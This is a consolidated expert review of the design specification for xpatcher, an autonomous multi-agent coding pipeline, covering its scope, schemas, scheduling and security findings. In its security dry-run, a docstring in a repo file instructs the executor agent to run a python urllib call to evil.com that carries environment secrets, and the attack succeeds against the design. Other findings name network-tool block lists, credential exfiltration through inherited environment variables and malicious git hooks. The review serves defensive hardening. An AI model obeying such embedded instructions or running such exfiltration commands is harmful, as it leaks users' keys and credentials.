# xpatcher Design Specification -- Consolidated Expert Review v2

**Date:** 2026-03-29
**Review Panel:** 8 expert agents (System Architect, Python Developer, QA Automation Engineer, Security Analyst, Automation Process Engineer, Product Owner, Product Manager, Project Manager)
**Spec Version:** 1.2 (Final Draft) + Missing Components Docs 13-17
**Prior Review:** v1 consolidated review (7 experts, same date) -- all 7 CRITs, 14 MAJs, 16 missing components resolved

---

## OVERALL VERDICT: CONDITIONALLY READY FOR IMPLEMENTATION

The specification is architecturally sound, internally consistent (after the prior review pass), and unusually thorough. An implementor can build from this spec. However, all 8 experts independently converge on three themes:

1. **The v1 scope is too large.** Cut to an MVP of 4-5 weeks, not 9+ weeks.
2. **Security hardening is required** before use on any non-fully-trusted codebase.
3. **Two untested assumptions** about Claude Code CLI flags (`--agent`, `--plugin-dir`) are load-bearing and must be validated before code is written.

---

## EXPERT VERDICTS AT A GLANCE

| Expert | Verdict | Key Finding |
|--------|---------|-------------|
| **System Architect** | Conditionally Ready | Appendix A contradicts canonical schemas; Claude CLI flags untested |
| **Python Developer** | Ready to Implement (with caveats) | Code is buildable; lexicographic sort bug; ~~missing dataclasses~~ defined |
| **QA Automation Engineer** | Quality Framework Ready (3 risks) | Transitive regression gap; negation check undefined for non-test ACs |
| **Security Analyst** | Needs Hardening | 3 critical vulns: Bash allowlist bypass, prompt injection, no egress controls |
| **Process Engineer** | Process Design Ready (3 ops risks) | Non-atomic task file movement; oscillation false positives; gap regression attribution |
| **Product Owner** | Reduce Scope | v1 is a v2 in disguise; core value is 4 agents + 10 stages, not 8 + 16 |
| **Product Manager** | Needs Refinement | 9-week timeline is 14-18 weeks real; prompt engineering is #1 risk |
| **Project Manager** | Needs Work | Roadmap has no effort estimates, no dependencies, no DoD; provides sprint 1 backlog |

---

## CRITICAL FINDINGS (Must Address Before Implementation)

### ~~CRIT-1: Claude CLI Flag Assumptions Are Untested~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** System Architect, Python Developer, Product Manager, Project Manager (4 of 8)

**Resolution:** All critical CLI flags validated against Claude Code CLI v2.1.87. Every flag the dispatcher depends on works as assumed. Key findings:
- `--agent` works with plugin agents using qualified names: `<plugin-name>:<agent-name>` (e.g., `xpatcher:planner`)
- `--plugin-dir` loads custom plugins; agents registered with prefix from `plugin.json` `name` field
- `--output-format json` returns a JSON array of typed events (not a single object) — `ClaudeSession` code updated
- `--resume <session_id>` correctly continues sessions with full context
- `--model` accepts aliases (`haiku`, `sonnet`, `opus`)
- `--max-turns`, `--allowed-tools`, `--disallowed-tools`, `--permission-mode` all work
- `total_cost_usd` available in result event — basic cost tracking possible in v1
- Spec updated: Section 7.7.1 (validation matrix), `ClaudeSession` rewritten, `AgentInvocation`/`AgentResult` dataclasses defined, OQ-1 marked resolved, cost management section updated

---

### ~~CRIT-2: Appendix A (Section 12) Contradicts Section 9 Canonical Schemas~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** System Architect, Python Developer (2 of 8)

**Resolution:** Appendix A (Section 12) and all missing-components documents (Sections 13-17) deleted entirely. The canonical schemas in Section 9 (Dispatcher Internals) are the sole schema reference. No stale copies remain.

---

### CRIT-3: Three Critical Security Vulnerabilities *(Partially Resolved 2026-03-29)*

**Flagged by:** Security Analyst

**Threat model decision (2026-03-29):** v1 targets **single developer on trusted private repos**. This scoping affects which mitigations are v1 blockers vs v2 items.

**CRIT-SEC-1: Bash allowlist bypass via `python`.** ✅ **v1 fix required.** Remove `python` from read-only agent allowlists; allow only specific complete commands. Section 8.5 (Risk Mitigation) updated.

**CRIT-SEC-2: No prompt injection defense.** ⚠️ **Partially deferred.** Basic anti-injection instructions added to all agent system prompts in v1. Full defense (input sanitization, output validation for injection markers) deferred to v2 — acceptable because v1 targets trusted repos only.

**CRIT-SEC-3: No network egress controls.** ✅ **v1 fix: Bash pattern blocking.** Block network commands (`curl`, `wget`, `nc`, `python -c` with network imports, etc.) via PreToolUse hook regex patterns. OS-level isolation (`unshare --net` / `sandbox-exec`) deferred to v2 for untrusted repos. Section 8.5 (Risk Mitigation) updated.

**v1 actions (confirmed):**
1. Remove `python` from read-only agent allowlists; allow only specific complete commands
2. Add basic anti-injection instructions to all agent system prompts
3. Block network commands in Bash patterns; scrub sensitive env vars before spawning agents
4. Change path resolution `except Exception: pass` to fail-closed

---

## MAJOR FINDINGS (High Risk If Ignored)

### ~~MAJ-1: v1 Scope Is Too Large -- All Business Experts Agree~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** Product Owner, Product Manager, Project Manager (3 of 3 business experts)

**Resolution:** Product owner decision: **keep the full 16-stage/8-agent spec for v1**. The complete pipeline is required for the intended autonomous SDLC workflow. The MVP cut would remove too many stages that are essential to the end-to-end value proposition (gap detection, documentation, simplification). Implementation timeline accepted as-is.

### MAJ-2: Prompt Engineering Is the #1 Schedule Risk

**Flagged by:** Product Manager, Project Manager, Python Developer

Getting LLMs to produce valid structured YAML reliably requires 5-10 iterations per agent. This work is empirically unpredictable and should start Day 1, not wait for the dispatcher.

**Action:** Start prompt engineering in parallel with foundation work. Treat agent prompt reliability as the primary risk, not the dispatcher code.

### ~~MAJ-3: subprocess.run() Is Incompatible with TUI Requirements~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** System Architect, Python Developer

**Resolution:** Product owner decision: **sync `subprocess.run()` for v1** with batch progress updates between agent invocations. The TUI shows stage transitions, elapsed time, and cost accumulation between invocations — not real-time token streaming. Async dispatcher with real-time streaming deferred to v1.1/v2. Section 9 (Dispatcher Internals) confirmed as-is.

### ~~MAJ-4: Reviewer Agent Is Miscast for Plan Reviews~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** System Architect

**Resolution:** Product owner decision: **create a separate `plan-reviewer` agent prompt**. A dedicated plan-reviewer agent definition added to Section 4 (Agent Definitions) with a plan-specific checklist covering: scope alignment with intent, task granularity, dependency completeness, risk coverage, feasibility, and acceptance criteria quality. The code-oriented reviewer remains for Stages 12-13 only. The plan-reviewer is used for Stages 3 and 7.

### MAJ-5: Task File Movement Between Directories Is Not Atomic

**Flagged by:** Process Engineer

Tasks move between `todo/`, `in-progress/`, `done/` directories. A crash between moving the file and updating `pipeline-state.yaml` creates divergent state. On resume, the dispatcher can't find the task file.

**Action:** Make `pipeline-state.yaml` the sole source of truth; rebuild directory structure from state on resume.

### ~~MAJ-6: Skipped Dependencies Optimistically Unblock Dependent Tasks~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** System Architect, Process Engineer

**Resolution:** Product owner decision: **default to blocking**. Tasks with skipped dependencies remain `BLOCKED` by default. The `xpatcher skip` command now requires `--force-unblock` to explicitly unblock dependents of skipped tasks. Without the flag, dependents stay `BLOCKED` and the user is informed which tasks are affected. Section 2.5 (DAG transition table) and Section 7.1 (skip command) updated.

### MAJ-7: Oscillation Detection Produces False Positives on Converging Severity

**Flagged by:** Process Engineer

If a finding drops from `critical` to `minor` (convergence), the same finding ID produces the same hash, triggering false oscillation detection. Tasks that are improving get prematurely escalated.

**Action:** Include severity in the oscillation hash. Treat same-ID-lower-severity as convergence, not oscillation.

### MAJ-8: Credential Exposure via Inherited Environment Variables

**Flagged by:** Security Analyst

Agents inherit the full environment including `ANTHROPIC_API_KEY`, AWS credentials, GitHub tokens. Combined with unrestricted executor Bash and no egress controls, credential exfiltration is trivial.

**Action:** Scrub environment before spawning agent subprocesses. Pass only `PATH`, `HOME`, `LANG`, `TERM`, `XPATCHER_HOME`.

### MAJ-9: Git Hooks in Target Repos Execute on `git commit`

**Flagged by:** Security Analyst

The executor runs `git commit`, which executes `.git/hooks/post-commit` in the target repo. A malicious hook can exfiltrate data silently.

**Action:** Run git commands with `core.hooksPath` set to an empty directory.

### ~~MAJ-10: Missing Dataclass Definitions~~ ✅ RESOLVED (2026-03-29)

**Flagged by:** Python Developer

**Resolution:** `AgentInvocation` and `AgentResult` dataclasses now defined in Section 7.7 (`ClaudeSession` rewrite). `AgentInvocation` includes: prompt, agent, session_id, max_turns, timeout, allowed_tools, disallowed_tools, model, permission_mode. `AgentResult` includes: session_id, raw_text, parsed, exit_code, cost_usd, duration_ms, num_turns, stop_reason, usage, events.

---

## MINOR FINDINGS (Track for Cleanup)

| # | Finding | Source |
|---|---------|--------|
| 1 | `ArtifactVersioner.latest_version()` lexicographic sort bug (v10 < v2) | Architect, Python Dev |
| 2 | Simplifier `/simplify` creates recursive self-invocation ambiguity | Architect |
| 3 | `BLOCKED` name collision between PipelineStage and TaskState | Architect |
| 4 | `xpatcher pending` scans "all known projects" but no project registry exists | Architect |
| 5 | Session lineage example contradicts adversarial isolation policy | Architect |
| 6 | `ROLLED_BACK` missing from PipelineStateModel validator | Architect |
| 7 | No feature slug generation spec (how "Add OAuth2" becomes "auth-redesign") | Architect |
| 8 | `BASH_WRITE_PATTERNS` `[>|]` blocks legitimate read-only pipes | Python Dev |
| 9 | `datetime.utcnow()` deprecated in Python 3.12+ used inconsistently | Python Dev |
| 10 | Two separate `_extract_yaml` implementations with different strategies | Python Dev |
| 11 | `PipelineStateFile.update()` duplicates write logic (DRY violation) | Python Dev |
| 12 | Signal handler uses `print()` which is not async-signal-safe | Python Dev |
| 13 | Tester/tech-writer scope checks use loose substring matching | Security |
| 14 | `CLAUDE_AGENT_NAME` env var is a trust boundary (not documented) | Security |
| 15 | No rate limiting on hook bypass attempts | Security |
| 16 | Audit logs in `.xpatcher/` may contain sensitive data | Security |
| 17 | Regression testing misses transitive import-chain regressions | QA |
| 18 | Negation check undefined for non-test (`command`, `browser`) AC types | QA |
| 19 | `should_pass` severity has no structured override audit mechanism | QA |
| 20 | Mutation testing target discrepancy: 60% (config) vs 70% (KPIs) | QA |
| 21 | No E2E test exercises multi-task features with DAG dependencies | QA |
| 22 | Quality tier keyword list not enumerated; left to LLM judgment | QA |
| 23 | E2E 2/3 stability metric too lenient for production confidence | QA |
| 24 | Context bridge quality is unverifiable (no minimum content threshold) | Process Eng |
| 25 | 30-minute soft gate for task review too short for real teams | Process Eng |
| 26 | Gap regression attribution undefined (who owns fix when gap breaks prior task) | Process Eng |

---

## DRY-RUN SIMULATIONS

### Development Dry-Run: Phase 1 (First 2 Weeks)

**Simulation by:** Python Developer, Project Manager

**Day 1-2: CLI Validation Spike (BLOCKER)**
- Test `claude -p --agent planner --plugin-dir ~/xpatcher/.claude-plugin/ --output-format json`
- Test `--resume <session_id>` with same/different `--agent` flags
- Test `--max-turns`, `--allowedTools`, `--bare`
- Document actual JSON envelope schema from real output
- **Decision gate:** If `--agent` doesn't exist, redesign agent invocation pattern (2-3 day spec revision)

**Day 3-5: Foundation**
- Implement schemas.py (all 11 Pydantic models from Section 9 + Section 14)
- Implement state.py (PipelineState machine + atomic file I/O)
- Begin session.py (ClaudeSession based on spike findings)

**Day 5-10: Core Integration**
- Complete session.py with YAML extraction and validation pipeline
- Implement context/builder.py (prompt assembly per agent)
- First real agent invocation: planner against a sample project
- Begin core.py dispatch loop (Stage 1-5 linear flow)

**Identified blockers:**
1. `--agent` flag may not exist (spike resolves this)
2. `AgentInvocation` / `AgentResult` dataclasses undefined
3. Feature slug generation algorithm undefined
4. YAML output reliability from planner (expect 3-5 prompt iterations)

### Operational Dry-Run: "Add OAuth2 to Express.js API"

**Simulation by:** System Architect, Process Engineer

| Stage | Duration Est. | Artifacts | Human Action | Risk |
|-------|-------------|-----------|-------------|------|
| 1. Intent | ~30s | intent.yaml | None | Low |
| 2. Planning | ~5 min | plan-v1.yaml | None | Medium (hallucination) |
| 3. Plan Review | ~3 min | plan-review-v1.yaml | None | Medium (reviewer miscast for plan review) |
| 5. Plan Approval | 1-30 min | decision.yaml | **Approve/Reject** | Gate delay |
| 6. Task Breakdown | ~2 min | 6-8 task YAMLs | None | Low |
| 7. Task Review | ~2 min | task-review-v1.yaml | Soft gate (30 min) | Too short |
| 9. Prioritization | ~5s | execution-plan.yaml | None | Low |
| 11-13. Execution | ~40 min | commits, quality reports | None | Medium (fix iterations) |
| 14. Gap Detection | ~3 min | gap-report-v1.yaml | None | Low |
| 15. Documentation | ~3 min | docs-report.yaml | None | Low (non-blocking) |
| 16. Completion | 1-30 min | completion.yaml | **Final review** | Gate delay |

**Total estimated time:** ~82 minutes execution + human gate delays
**Estimated API cost:** ~$13-20 (planner Opus, reviewer Opus, 6-8 executor Sonnet sessions)
**Agent invocations:** ~38

**Identified risks:**
- Plan review quality is low (reviewer prompt not designed for plan review)
- If any task requires 3 fix iterations, adds ~15 min per stuck task
- No cost visibility during execution
- If user is slow at plan approval (4+ hours), executor sessions lose context on resume

### Security Dry-Run: Malicious File in Target Repo

**Simulation by:** Security Analyst

A file `src/config/settings.py` contains a docstring with hidden instructions to run `python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com/?' + ...)"`. The executor reads the file, follows the embedded instruction, and the Bash command passes all PreToolUse hook checks (no redirects, no write patterns). Environment variables containing API keys and secrets are exfiltrated.

**Result:** Attack succeeds against current design. Three mitigations required (env scrubbing, network command blocking, anti-injection prompt instructions).

---

## PRODUCT DECISIONS (Resolved 2026-03-29)

### Architecture / Engineering

1. ~~**Claude CLI validation:** Can we allocate Day 1-2 for a CLI flag validation spike?~~ ✅ **RESOLVED: Yes.** Already completed (2026-03-29). All critical CLI flags validated against Claude Code CLI v2.1.87.

2. ~~**Sync vs async dispatcher:** Is real-time TUI streaming a v1 requirement, or can v1 use synchronous subprocess.run()?~~ ✅ **RESOLVED: Sync for v1.** v1 uses synchronous `subprocess.run()` with batch progress updates between agent invocations. Real-time streaming deferred to v1.1/v2 with async dispatcher. MAJ-3 resolved.

3. ~~**Plan reviewer:** Should we create a separate plan-review agent prompt?~~ ✅ **RESOLVED: Yes, separate comprehensive prompt.** A dedicated `plan-reviewer` agent prompt is added to Section 4 (Agent Definitions). The code-oriented reviewer is not suitable for plan reviews. MAJ-4 resolved.

4. ~~**Skipped dependency policy:** Default to blocking or unblocking?~~ ✅ **RESOLVED: Default to blocking (safe).** Tasks with skipped dependencies are blocked by default. Users must explicitly pass `--force-unblock` to override. Section 2.5 transition table and Section 7.1 skip semantics updated. MAJ-6 resolved.

5. ~~**Appendix A cleanup:** Delete entirely or regenerate from Section 9?~~ ✅ **RESOLVED: Deleted.** Appendix A (Section 12) and all missing-components documents (Sections 13-17) deleted entirely. The canonical schemas live in Section 9 (Dispatcher Internals). Stale schemas in Appendix A were a confirmed source of confusion (CRIT-2).

### Scope / Business

6. ~~**v1 scope reduction:** Accept the MVP cut or keep the full spec?~~ ✅ **RESOLVED: Full 16-stage/8-agent spec.** The complete pipeline is the v1 target. No MVP cut. MAJ-1 noted but overridden by product decision — the full scope is required for the intended workflow. Implementation timeline adjusted accordingly.

7. ~~**Cost visibility:** Is zero cost tracking acceptable for v1?~~ ✅ **RESOLVED: Must show total pipeline cost.** The dispatcher accumulates `total_cost_usd` from each `AgentResult` (available via Claude CLI `--output-format json` result event, validated 2026-03-29). v1 displays: (a) running cost in TUI footer during execution, (b) per-agent and per-stage cost breakdown in `completion.yaml`, (c) total pipeline cost in completion summary. No budget enforcement in v1 — visibility only.

8. ~~**Expert panel:** Defer to v2 or keep?~~ ✅ **RESOLVED: Defer to v2.** v1 uses a single planner with a multi-perspective checklist prompt (covering frontend, backend, security, UX, devops, QA perspectives as a structured checklist rather than separate subagent invocations). Expert panel with subagent spawning deferred to v2. Section 4.2.1 updated.

9. ~~**Completion gate (Stage 16):** Keep as human gate?~~ ✅ **RESOLVED: Keep as human gate.** Stage 16 remains a mandatory human approval gate. The PR review is a separate downstream process; xpatcher does not auto-merge.

### Security

10. ~~**Threat model:** Single developer on trusted private repos?~~ ✅ **RESOLVED: Yes, single developer on trusted private repos.** CRIT-SEC-2 (prompt injection) partially deferred to v2 — basic anti-injection instructions added to agent prompts, but full defense (input sanitization, output validation for injection markers) is v2. CRIT-SEC-1 (Bash allowlist bypass via `python`) and CRIT-SEC-3 (network egress) still addressed in v1 via Bash pattern blocking.

11. ~~**Network sandbox:** OS-level isolation or Bash pattern blocking?~~ ✅ **RESOLVED: Bash pattern blocking.** v1 relies on Bash command pattern blocking in the PreToolUse hook (blocking `curl`, `wget`, `nc`, `python -c`, etc.) rather than OS-level sandboxing (`unshare --net` / `sandbox-exec`). Sufficient for the single-developer-on-trusted-repos threat model. OS-level isolation considered for v2 if untrusted repos come into scope.

---

## RECOMMENDED ACTION PLAN

### Before Phase 1 (2-3 days)

| # | Action | Owner | Duration |
|---|--------|-------|----------|
| ~~1~~ | ~~**CLI validation spike** -- test all `claude` CLI flags~~ ✅ Done (2026-03-29) | Engineer | ~~1-2 days~~ |
| ~~2~~ | ~~**Delete Appendix A** from Section 12~~ ✅ Done (2026-03-29) — Section 12 and Sections 13-17 deleted entirely | Spec author | ~~1 hour~~ |
| 3 | **Security hardening** -- remove `python` from allowlists, add anti-injection prompts, add network command blocking, fix fail-open path check, scrub env vars, set `core.hooksPath` | Spec author + Engineer | 1 day |
| ~~4~~ | ~~**Scope decision** -- confirm MVP cut or full spec~~ ✅ Done (2026-03-29) — Full 16-stage/8-agent spec confirmed | Product Owner | ~~1 hour~~ |
| ~~5~~ | ~~**Sync vs async decision** for v1 dispatcher~~ ✅ Done (2026-03-29) — Sync `subprocess.run()` for v1 | Architect + PO | ~~30 min~~ |
| ~~6~~ | ~~**Define AgentInvocation / AgentResult** dataclasses~~ ✅ Done (2026-03-29) | Engineer | ~~1 hour~~ |
| 7 | **Fix ArtifactVersioner sort** -- use numeric sort | Spec author | 15 min |
| 8 | **Fix oscillation hash** -- include severity | Spec author | 15 min |

### During Phase 1 (Weeks 1-2)

- Start prompt engineering in parallel with dispatcher foundation
- Validate YAML output reliability for planner and executor against real codebases
- Implement state.py, schemas.py, session.py from spec
- First real agent invocation by end of week 1

### Definition of Done: v1 Ready

A minimum of 3 real-world projects have been run through the pipeline with:
- >70% task success rate (no human intervention)
- >50% first-pass review approval rate
- <3 average iterations per task
- All 4 core agents producing valid YAML >85% of the time
- Crash recovery works (kill and resume mid-pipeline)

---

## INDIVIDUAL EXPERT REPORTS

| # | Report | File |
|---|--------|------|
| 1 | System Architect Review | [09-system-architect-review.md](09-system-architect-review.md) |
| 2 | Python Developer Implementability Review | [09-implementability-review.md](09-implementability-review.md) |
| 3 | QA Automation Engineering Review | [09-qa-automation-review.md](09-qa-automation-review.md) |
| 4 | Security Analyst Review | [09-security-review.md](09-security-review.md) |
| 5 | Process Engineering Review | [09-process-engineering-review.md](09-process-engineering-review.md) |
| 6 | Product Owner Review | [09-product-owner-review.md](09-product-owner-review.md) |
| 7 | Product Manager Review | [09-product-manager-review.md](09-product-manager-review.md) |
| 8 | Project Manager Review | [09-project-management-review.md](09-project-management-review.md) |

---

*End of consolidated expert review v2.*
